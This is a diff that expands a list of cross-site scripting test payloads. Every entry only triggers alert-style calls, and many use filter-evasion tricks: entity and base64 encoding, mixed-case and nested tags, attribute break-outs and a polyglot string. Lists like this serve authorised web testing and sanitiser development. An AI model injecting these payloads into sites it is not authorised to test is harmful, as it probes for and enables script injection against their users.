@@ -1,4 +1,30 @@
+<script>alert(1)</script>
 <script>alert('XSS')</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script>document.write('XSS')</script>
+<script>console.log('XSS')</script>
+<img src=x onerror=alert(1)>
 <img src=x onerror=alert('XSS')>
-<svg/onload=alert('XSS')>
-javascript:alert('XSS')
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<iframe onload=alert(1)>
+<video src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<a href="javascript:alert(1)">click</a>
+<a href="javascript:alert('XSS')">click</a>
+<iframe src="javascript:alert(1)"></iframe>
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><script>alert(1)</script>
+"><svg onload=alert(1)>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror="alert(1)">
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<sCrIpT>alert(1)</sCrIpT>
+<scr<script>ipt>alert(1)</script>
+<img src=x onerror=alert(1)//
+"><img src=x onerror=alert(1)><!--
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
